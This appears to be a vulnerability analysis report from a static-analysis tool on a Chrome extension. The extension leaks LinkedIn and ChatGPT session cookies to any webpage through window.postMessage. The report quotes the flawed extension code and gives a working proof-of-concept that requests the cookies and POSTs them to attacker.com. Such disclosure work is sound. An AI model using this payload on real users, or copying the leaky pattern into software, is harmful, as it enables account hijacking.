# CoCo Analysis: fjlnhjhlblcejjfiodnaapbbmooodjcg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (cookies_source → window_postMessage_sink)

---

## Sink: cookies_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fjlnhjhlblcejjfiodnaapbbmooodjcg/opgen_generated_files/bg.js
Line 684-697    var cookie_source = {...} (CoCo framework code)

**Note:** CoCo only detected flows in framework code (before the 3rd "// original" marker). The actual vulnerability exists in the extension code after line 963.

**Code:**

```javascript
// Content script - cs_0.js (lines 474-484)
window.addEventListener("message", function (event) {
  console.log("message received", event.data)
  if (event.data.type && event.data.type === "SYNC_LINKEDIN") {
    chrome.runtime.sendMessage({type: "SYNC_LINKEDIN"}, function (response) {}); // ← attacker triggers
  }

  if (event.data.type && event.data.type === 'SYNC_CHATGPT') {
    console.log("sending message to background");
    chrome.runtime.sendMessage({type: "SYNC_CHATGPT"}, function (response) {}); // ← attacker triggers
  }
});

// Background script - bg.js (lines 965-988)
chrome.runtime.onMessage.addListener(function (event, sender, sendResponse) {
  if (event.type == "SYNC_LINKEDIN") {
    console.log("linkedin event");
    chrome.cookies.getAll(
      {domain: ".www.linkedin.com"},
      function (linkedinCookies) { // ← Retrieves LinkedIn cookies
        console.log(linkedinCookies);
        chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
          chrome.tabs.sendMessage(
            tabs[0].id,
            {type: "LINKEDIN_DATA", linkedinData: linkedinCookies}, // ← Sends cookies to content script
            function (response) {}
          );
        });
      }
    );
    sendResponse({response: "working on it"});
  }

  if (event.type == "SYNC_CHATGPT") {
    console.log("chatgpt data request received");
    chrome.cookies.getAll({domain:"chat.openai.com"},function (gptCookies){ // ← Retrieves ChatGPT cookies
      console.log(gptCookies);
      chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
        chrome.tabs.sendMessage(
          tabs[0].id,
          {type: "CHATGPT_DATA", gptData:gptCookies}, // ← Sends cookies to content script
          function (response) {}
        );
      });
    });
  }
});

// Content script - cs_0.js (lines 486-506)
chrome.runtime.onMessage.addListener(function (event, sender, sendResponse) {
  if (event.type == "LINKEDIN_DATA") {
    //RECEIVED LINKEDIN DATA
    //SEND IT TO APPLIENT
    window.postMessage(
      {type: "LINKEDIN_DATA", linkedinData: event.linkedinData}, // ← Leaks LinkedIn cookies to webpage
      "*"
    );
    sendResponse({response: "got it"});
  }

  if (event.type == "CHATGPT_DATA") {
    //RECEIVED CHAT DATA
    //SEND IT TO APPLIENT
    window.postMessage(
      {type: "CHATGPT_DATA", gptData:event.gptData}, // ← Leaks ChatGPT cookies to webpage
      "*"
    );
    sendResponse({response: "got it"});
  }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage in content script

**Attack:**

```javascript
// From any webpage matching the content script (*.linkedin.com/* or *.fastinterviews.com/*)
// Step 1: Request LinkedIn cookies
window.postMessage({type: "SYNC_LINKEDIN"}, "*");

// Step 2: Listen for the leaked cookies
window.addEventListener("message", function(event) {
  if (event.data.type === "LINKEDIN_DATA") {
    console.log("Stolen LinkedIn cookies:", event.data.linkedinData);
    // Send to attacker's server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(event.data.linkedinData)
    });
  }
});

// Alternative: Request ChatGPT cookies
window.postMessage({type: "SYNC_CHATGPT"}, "*");

window.addEventListener("message", function(event) {
  if (event.data.type === "CHATGPT_DATA") {
    console.log("Stolen ChatGPT cookies:", event.data.gptData);
    // Send to attacker's server
    fetch("https://attacker.com/steal", {
      method: "POST",
      body: JSON.stringify(event.data.gptData)
    });
  }
});
```

**Impact:** Critical sensitive data exfiltration - attacker can steal:
1. **LinkedIn session cookies** (domain: .www.linkedin.com) - allowing account hijacking
2. **ChatGPT session cookies** (domain: chat.openai.com) - allowing account hijacking
3. The cookies are sent to ANY webpage via window.postMessage with targetOrigin="*"
4. The attacker can:
   - Hijack LinkedIn accounts to access professional information, messages, connections
   - Hijack ChatGPT accounts to access conversation history and use paid features
   - Use stolen sessions for social engineering, phishing, or identity theft

**Content Script Matching:**
- Content script runs on `*.linkedin.com/*` and `*.fastinterviews.com/*`
- Any webpage on these domains can trigger the cookie theft
- An attacker controlling a subdomain or XSS on these sites can exploit this vulnerability

**Permission Check:**
- Extension has `"cookies"` permission in manifest.json, allowing cookie access
- Extension has `"tabs"` permission, allowing tab queries
